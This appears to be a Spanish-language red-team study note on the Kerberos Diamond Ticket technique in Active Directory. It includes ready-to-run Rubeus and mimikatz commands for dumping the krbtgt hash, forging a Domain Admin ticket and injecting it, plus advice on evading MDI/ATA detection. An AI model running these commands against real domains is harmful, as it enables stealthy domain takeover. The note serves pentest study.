---
aliases:
  - Diamond Ticket
tags:
  - technique/persistence
  - technique/kerberos
  - technique/defense-evasion
  - asset/active-directory
  - env/windows
  - cred/kerberos
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Active Directory]]"
tertiary categories:
  - "[[Active Directory Explotación]]"
kind: Technique
linked:
  - "[[Golden Ticket]]"
  - "[[Silver Ticket]]"
  - "[[DCSync]]"
---
# Diamond Ticket

Variante **sigilosa** del [[Golden Ticket]]. En vez de forjar un TGT desde cero (Golden, que genera un PAC "inventado" detectable), el Diamond Ticket **pide un TGT legítimo al KDC, lo descifra con el hash de `krbtgt`, modifica el PAC** (agrega grupos/SID) y lo **re-cifra**. El ticket conserva toda la estructura real que pone el DC → evade detecciones que comparan el PAC contra lo que un KDC produciría.

Requiere el hash AES/RC4 de `krbtgt` (igual que Golden) → vía [[DCSync]].

---

## Cheatsheet

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `Rubeus.exe diamond /krbkey:<AES256_krbtgt> /user:U /password:P /enctype:aes /ticketuser:administrator /ticketuserid:500 /groups:512` | TGT real modificado → administrator/DA | Persistencia stealth con creds de un user válido. |
| `Rubeus.exe diamond /tgtdeleg /krbkey:<AES256> /ticketuser:administrator /ticketuserid:500 /groups:512,519` | Usa `tgtdeleg` (sin password) + diamond | Si ya tenés sesión del user. |
| `lsadump::dcsync /user:krbtgt /domain:corp.local` (mimikatz) | Hash AES/RC4 de krbtgt (insumo) | Pre-requisito. |
| `klist` / `Rubeus.exe ptt /ticket:diamond.kirbi` | Inyectar el ticket en la sesión | Usar el ticket. |

```bash
# Flujo (Rubeus): pedir TGT legítimo + modificar PAC en un paso
Rubeus.exe diamond /krbkey:5e3d19...AES256...krbtgt /user:lowpriv /password:Pass123! \
  /enctype:aes /ticketuser:administrator /ticketuserid:500 /groups:512 /ptt
# Verificar
klist
```

---

## Overview

**Golden vs Diamond:** Golden forja el TGT entero offline → el PAC no coincide con la "firma de fábrica" del KDC, y herramientas como MDI/ATA pueden flaggear TGTs sin AS-REQ previo. Diamond **parte de un TGT auténtico** (hay AS-REQ/AS-REP real en los logs) y solo altera el PAC → mucho más difícil de distinguir de actividad legítima.

**Costo:** igual que Golden necesitás el hash de `krbtgt` (= ya comprometiste el dominio). Es técnica de **persistencia/evasión**, no de escalada.

> [!tip] Cuándo Diamond sobre Golden
> Si el entorno tiene MDI/ATA o caza tickets anómalos, usá Diamond. Si solo querés acceso rápido y no te importa el ruido, Golden alcanza.

---

## Recursos

- [The Hacker Recipes — Forged tickets](https://www.thehacker.recipes/ad/persistence/kerberos/forged-tickets) — Golden/Silver/Diamond/Sapphire.
- [Rubeus — diamond](https://github.com/GhostPack/Rubeus#diamond) — comando y opciones.
